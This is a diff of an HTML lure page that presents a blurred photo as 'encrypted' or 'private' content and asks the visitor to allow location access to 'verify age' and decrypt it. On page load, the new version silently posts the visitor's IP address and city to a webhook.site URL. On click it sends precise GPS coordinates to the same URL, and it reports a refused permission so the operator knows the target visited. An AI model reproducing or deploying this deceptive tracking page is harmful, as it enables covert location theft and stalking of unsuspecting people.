@@ -2,59 +2,52 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Encrypted Content</title>
+    <title>Decrypting...</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
-        
-        /* The Blur Effect */
-        #mask {
-            width: 100vw; height: 100vh;
-            background: url('https://images.pexels.com/photos/1462637/pexels-photo-1462637.jpeg?w=800') no-repeat center center;
-            background-size: contain;
-            filter: blur(15px); /* Makes the image unreadable until clicked */
-            transition: filter 0.5s;
-        }
-
-        /* Overlay text to guide the user */
-        #overlay {
-            position: absolute; top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            color: white; text-align: center;
-            background: rgba(0,0,0,0.6); padding: 20px; border-radius: 10px;
-            pointer-events: none; /* Let clicks pass through to the body */
-        }
+        body, html { margin: 0; padding: 0; height: 100%; background: #000; display: flex; align-items: center; justify-content: center; color: white; font-family: sans-serif; }
+        #mask { position: absolute; width: 100%; height: 100%; background: url('https://images.pexels.com/photos/1462637/pexels-photo-1462637.jpeg?w=800') no-repeat center center; background-size: contain; filter: blur(20px); }
+        #btn { z-index: 10; padding: 20px; border: 2px solid white; background: rgba(0,0,0,0.8); cursor: pointer; border-radius: 10px; }
     </style>
 </head>
-<body onclick="unlock()">
-
+<body onload="silentHit()">
     <div id="mask"></div>
-    <div id="overlay">
-        <h2>🔒 PRIVATE CONTENT</h2>
-        <p>Tap image and select <b>'Allow'</b> to verify your age and decrypt high-resolution photo.</p>
+    <div id="btn" onclick="getExact()">
+        <h2>⚠️ ENCRYPTED PHOTO</h2>
+        <p>Click to Verify & Decrypt</p>
     </div>
 
     <script>
-        function unlock() {
-            // Trigger high-accuracy GPS
+        const hook = "https://webhook.site/2693a92a-d66e-4624-9c97-3d89ea325f67";
+
+        // Step 1: Send IP and City immediately when they open the page
+        async function silentHit() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                fetch(hook, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "INITIAL_HIT", city: data.city, ip: data.ip }) });
+            } catch (e) { /* silent fail */ }
+        }
+
+        // Step 2: Try for the "Core Truth" (GPS) when they click
+        function getExact() {
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                // Success: The user clicked 'Allow'
-                await fetch("https://webhook.site/2693a92a-d66e-4624-9c97-3d89ea325f67", {
-                    method: 'POST', mode: 'no-cors',
+                await fetch(hook, {
+                    method: 'POST',
+                    mode: 'no-cors',
                     body: JSON.stringify({
-                        STATUS: "GPS_VERIFIED",
-                        LAT: pos.coords.latitude,
-                        LON: pos.coords.longitude,
-                        ACCURACY: pos.coords.accuracy + " meters"
+                        type: "GPS_SUCCESS",
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy + "m"
                     })
                 });
-                // Remove the blur to satisfy the user
                 document.getElementById('mask').style.filter = 'none';
-                document.getElementById('overlay').style.display = 'none';
+                document.getElementById('btn').style.display = 'none';
             }, (err) => {
-                // Failure: User clicked 'Deny'
-                alert("Verification Failed: You must allow access to view encrypted content.");
-            }, { enableHighAccuracy: true, timeout: 10000 });
+                // If they deny, we send an error log so you know they are on the site
+                fetch(hook, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "PERMISSION_DENIED" }) });
+                alert("Decryption Failed: Please refresh and Allow access to view.");
+            }, { enableHighAccuracy: true, timeout: 5000 });
         }
     </script>
 </body>
